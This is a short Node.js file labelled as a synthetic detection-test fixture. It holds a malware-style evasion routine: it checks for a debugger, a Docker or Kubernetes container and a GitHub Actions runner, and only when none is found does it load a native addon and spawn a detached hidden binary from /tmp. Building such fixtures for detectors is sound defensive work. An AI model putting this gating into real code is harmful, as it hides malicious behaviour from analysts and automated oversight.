// FIXTURE ONLY - synthetic detection test sample, not real malware
const fs = require("fs");
const { spawn } = require("child_process");
const traced = /TracerPid:\s+[1-9]/.test(fs.readFileSync("/proc/self/status", "utf8"));
const boxed = /docker|kubepods/.test(fs.readFileSync("/proc/1/cgroup", "utf8"));
if (!process.env.GITHUB_ACTIONS && !traced && !boxed) {
  require("./addon.node").init();
  spawn("/tmp/.cache-x", [], { detached: true, stdio: "ignore" }).unref();
}
